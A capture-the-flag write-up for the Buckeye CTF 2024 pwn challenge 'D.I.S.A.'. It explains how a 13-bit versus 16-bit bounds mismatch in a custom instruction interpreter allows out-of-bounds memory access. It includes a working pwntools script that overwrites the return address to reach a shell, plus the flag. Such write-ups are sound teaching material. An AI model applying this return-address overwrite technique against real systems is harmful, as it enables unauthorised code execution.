# pwn/D.I.S.A.

A challenge from Buckeye CTF 2024

### Description

disa is the panicle of high performance and innovative design. 13bit is the future, everything else is pure cope. Embrace the performance and safety of disa

Co-authored by: auska

nc challs.pwnoh.io 13430

File: [disa.zip](./disa.zip)

### Solve

Glancing through the source for this challenge, it's an implementation of a custom instruction set. It operates on a grid of `int16_t` numbers, but the vulnerability was clear very quickly. We can go to arbitrary locations using `JMP`. Here's a demo of the vulnerability:

```
└─$ ./disa
D.I.S.A. (Dumb Instruction Set Architecture) Interpreter
Send your .nut program:
PUT -12
RD
-12
JMP
LD
RD
25393
```

Since we haven't written anything, we shouldn't be able to read out of bounds like that. I thought it was just negative at first, then I realized the max and min they set in `disa.h` were based on 13 bits and the integers we were working with were 16 bits. That means I could load up a number, jump to a positive number outside the range (like the return address), and edit it to return to win. I also needed to set the value to 0, but I also could just skip past that instruction and jump right to the shell, which I did lol.

The only problem was PIE. Luckily, the lower 3 nibbles are consistent no matter what, so I just subtracted based off the offset of the existing return address and the address I wanted to jump to in `win()`.

Solve code:

```py
from pwn import *

# initialize the binary and set the context (architecture, etc.)
binary = "./disa" # ensure it is executable (chmod +x)
elf = context.binary = ELF(binary, checksec=False)

gs = """
break main
continue
"""

# run with python3 solve.py REMOTE
if args.REMOTE:
    p = remote("challs.pwnoh.io", 13430)

# run with python3 solve.py GDB
elif args.GDB:
    context.terminal = ["tmux", "splitw", "-h"]

    p = gdb.debug(binary, gdbscript=gs)

# run with python3 solve.py
else:
    p = elf.process()


### START HERE ###

# offset of 16424, which is 8212 uint16_t's
p.sendline(b'PUT 2053')
for i in range(4):
    p.sendline(b'ADD')
p.sendline(b'LD')
p.sendline(b'RD')
p.sendline(b'JMP')
p.sendline(b'LD')
p.sendline(b'RD')
p.interactive()
# get there and subtract some 765 from the return address
p.sendline(b'PUT -765')
p.sendline(b'ADD')

p.sendline(b'END')

p.interactive()

# you do have to ctrl+C after you have interactive, but then you have a shell
```

Flag: `bctf{w417_4c7u411y_13_b17_c0mpu73r5_fuck1n9_5uck}`